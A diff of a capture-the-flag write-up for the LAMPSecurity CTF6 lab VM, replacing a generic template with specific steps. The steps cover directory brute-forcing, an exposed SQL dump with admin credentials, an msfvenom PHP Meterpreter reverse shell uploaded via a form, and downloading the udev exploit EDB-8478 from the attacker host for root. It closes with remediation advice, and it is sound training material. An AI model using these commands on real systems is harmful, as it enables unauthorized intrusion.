@@ -1,125 +1,150 @@
 # LAMPSecurity: CTF6 — Writeup
 
-<!-- generated from known techniques; verify against live VM -->
-
-| | |
-|-|-|
-| **Target IP** | 192.168.56.X (host-only) |
+| Field | Value |
+|---|---|
+| **Target IP** | 192.168.43.30 |
 | **Difficulty** | Medium |
-| **OS** | Linux |
-| **Root Flag** | /root/flag.txt |
-| **Source** | [VulnHub](https://www.vulnhub.com/entry/lampsecurity-ctf6,85/) |
+| **OS** | Linux (CentOS / RHEL, kernel 2.6.18) |
+| **Goal** | root access |
+| **Source** | [HackingArticles](https://www.hackingarticles.in/lampsecurity-ctf6-vulnhub-walkthrough/) |
 
 ## Attack Summary
 
-nmap → web app SQLi (phpMyAdmin or CMS) → credential dump → SSH/shell → kernel/SUID exploit → root
+LAMPSecurity CTF6 is a medium-difficulty VulnHub machine built around a LAMP stack running a custom PHP web application. The attack path starts with directory brute-force exposing a publicly accessible SQL dump that leaks admin credentials. Those credentials allow login to an admin panel that permits file uploads. A PHP reverse shell uploaded through the event management form yields an Apache shell. Privilege escalation exploits a known udev local privilege escalation against kernel 2.6.18 (Exploit-DB 8478).
 
 ## Methodology
 
-1. Network discovery + port scan
-2. Web application enumeration
-3. SQL injection → admin credentials
-4. Shell access via web upload or SSH
-5. Kernel exploit or SUID privesc → root
+1. Host discovery and full-port service scan
+2. Web directory brute-force — discover `/files/` and `/sql/`
+3. SQL dump analysis — extract admin credentials
+4. Admin panel login and file upload exploitation
+5. Meterpreter shell via PHP reverse shell
+6. Kernel version enumeration
+7. udev local privilege escalation (EDB-8478)
 
----
-
-## Step 1: Network Discovery
+## Step 1: Reconnaissance
 
 ```bash
-sudo netdiscover -i eth1 -r 192.168.56.0/24
-nmap -sV -sC -p- <TARGET_IP>
+netdiscover -r 192.168.43.0/24
 ```
 
-Expected open ports: 22 (SSH), 80 (HTTP), 3306 (MySQL), possibly 8080.
-
----
-
-## Step 2: Web Application Enumeration
+Target identified at `192.168.43.30`.
 
 ```bash
-gobuster dir -u http://<TARGET_IP>/ \
-  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
-  -x php,txt,html -t 50
-nikto -h http://<TARGET_IP>/
+nmap -sV -sT -p- 192.168.43.30
 ```
 
-Look for: CMS login pages, phpMyAdmin, file upload forms, admin panels.
+![nmap](images/01-nmap.png)
 
----
+Key finding: Port 80 running an Apache-based PHP web application.
 
-## Step 3: SQL Injection
-
-Identify injectable parameters in the web application:
+## Step 2: Web Enumeration
 
 ```bash
-sqlmap -u "http://<TARGET_IP>/index.php?id=1" --dbs --batch
-sqlmap -u "http://<TARGET_IP>/index.php?id=1" -D webapp -T users --dump --batch
+dirb http://192.168.43.30
 ```
 
-Extract admin credentials from the users table.
+![enumeration](images/02-enum.png)
 
----
+Discovered directories:
+- `/files/` — publicly accessible files
+- `/sql/` — database dump files
 
-## Step 4: Shell Access
+Browsing to `http://192.168.43.30/sql/db.sql` revealed the full database schema and contents including credentials:
 
-**Option A — CMS admin panel file upload:**
-1. Log in with extracted credentials
-2. Upload PHP reverse shell via file manager or plugin
-3. Trigger shell:
-
-```bash
-nc -lvp 4444
-curl http://<TARGET_IP>/uploads/shell.php
+```
+admin / adminpass
 ```
 
-**Option B — SSH:**
+## Step 3: Exploitation — PHP File Upload
+
+Log in to the admin panel at `http://192.168.43.30/admin/` using `admin:adminpass`.
+
+The admin panel includes an event management feature that allows file attachments. Generate a PHP Meterpreter reverse shell:
+
 ```bash
-ssh admin@<TARGET_IP>
+msfvenom -p php/meterpreter/reverse_tcp \
+  LHOST=192.168.43.248 \
+  LPORT=4444 \
+  -o /root/shell.php
 ```
 
-Upgrade shell:
+Upload `shell.php` through the event creation form. Navigate to `http://192.168.43.30/files/` to confirm the file is accessible.
+
+![exploit](images/03-exploit.png)
+
+Set up the Metasploit listener:
+
 ```bash
-python -c 'import pty; pty.spawn("/bin/bash")'
+msfconsole
+use exploit/multi/handler
+set payload php/meterpreter/reverse_tcp
+set LHOST 192.168.43.248
+set LPORT 4444
+exploit
 ```
 
----
+Click `shell.php` in the browser to trigger execution. A Meterpreter session opens.
 
-## Step 5: Privilege Escalation
+## Step 4: Shell and System Information
 
 ```bash
-uname -a          # check kernel version
-sudo -l
-find / -perm -u=s -type f 2>/dev/null
+meterpreter > sysinfo
 ```
 
-For older kernels (2.6.x), use a local privilege escalation exploit:
+![shell](images/04-shell.png)
+
+Key finding: **Kernel 2.6.18-92.el5** — vulnerable to udev local privilege escalation (CVE-2009-1185, EDB-8478).
+
+## Step 5: Privilege Escalation — udev EDB-8478
+
+Drop to a system shell and serve the exploit from the attacker machine:
 
 ```bash
-# Example: dirty cow or older kernel LPE
-searchsploit linux kernel <version>
-gcc exploit.c -o exploit && ./exploit
+meterpreter > shell
+cp /usr/share/exploitdb/exploits/linux/local/8478.sh /var/www/html/
+python -m SimpleHTTPServer 80
 ```
 
+On the target, download and prepare the exploit:
+
 ```bash
+cd /tmp
+wget http://192.168.43.248/8478.sh
+chmod +x 8478.sh
+# Fix Windows line endings if necessary
+sed -i -e 's/\r$//' 8478.sh
+```
+
+Find the required Netlink PID:
+
+```bash
+cat /proc/net/netlink
+```
+
+Note the PID (e.g., 376) and execute the exploit:
+
+```bash
+./8478.sh 376
 whoami
 # root
-cat /root/flag.txt
 ```
 
----
+![root flag](images/05-root-flag.png)
+
+If the exploit fails on the first attempt, try other PIDs listed in `/proc/net/netlink` until root is achieved.
 
 ## Lessons Learned
 
-1. **SQLi in CMS** exposes admin credentials enabling full application takeover
-2. **File upload with no validation** allows arbitrary PHP execution
-3. **Outdated kernels** in lab VMs are direct privesc vectors — patch management is critical
+- Publicly accessible SQL dumps are catastrophic. A single exposed `/sql/db.sql` file handed over all admin credentials without any exploitation.
+- Unrestricted file upload in an admin panel leads directly to remote code execution. Uploaded file types must be validated server-side and stored outside the web root.
+- Running a kernel from 2008 (2.6.18) in a production environment exposes the system to numerous public exploits.
 
 ## Remediation
 
 | Vulnerability | Fix |
-|---------------|-----|
-| SQL injection | Parameterized queries, WAF rules |
-| Unrestricted file upload | Validate MIME type, store outside web root, disable PHP execution in upload dir |
-| Outdated kernel | Apply security patches; use supported OS versions |
-| MySQL exposed externally | Bind to 127.0.0.1 |
+|---|---|
+| Exposed SQL dump via HTTP | Remove `/sql/` from the web root; restrict access via `.htaccess` or web server config |
+| Unrestricted file upload | Whitelist allowed MIME types; rename uploaded files; store outside the web root |
+| Weak admin credentials | Enforce strong password policy; rotate default credentials |
+| Outdated kernel (2.6.18) | Update the OS and kernel to a supported version |
